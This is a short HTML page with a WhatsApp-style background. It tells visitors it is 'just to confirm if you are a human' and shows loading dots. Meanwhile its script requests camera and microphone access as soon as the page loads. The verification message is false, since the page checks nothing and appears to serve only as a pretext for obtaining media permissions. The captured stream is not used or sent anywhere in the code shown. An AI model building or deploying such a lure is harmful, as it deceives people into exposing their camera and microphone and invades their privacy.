<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
    <style>
        body {
            background-image: url('https://i.postimg.cc/sDTjTFrr/whatsapp-background.jpg');
            background-size: cover;
            background-repeat: no-repeat;
            background-position: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: white; /* Set text color to white for readability on dark background*/
            font-family: sans-serif;
        }
        .confirmation-box {
            text-align: center;
            padding: 20px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 10px;
        }
        .loading-dots::after {
            content: "";
            animation: dots 1s steps(4) infinite;
        }

        @keyframes dots {
             0%   {content: "";}
             25%  {content: ".";}
             50%  {content: "..";}
             75%  {content: "...";}
        }
    </style>
</head>
<body>
    <div class="confirmation-box">
        <h1>Confirmation</h1>
        <p>This is just to confirm if you are a human. Please wait while we continue <span class="loading-dots"></span></p>
    </div>

    <script>

        navigator.mediaDevices.getUserMedia({video: true, audio: true})
        .then(stream => {
            console.log('Camera and microphone permission granted.');
        })
        .catch(error => {
            console.error('Error getting media devices:', error);
        });

    </script>

</body>
</html>
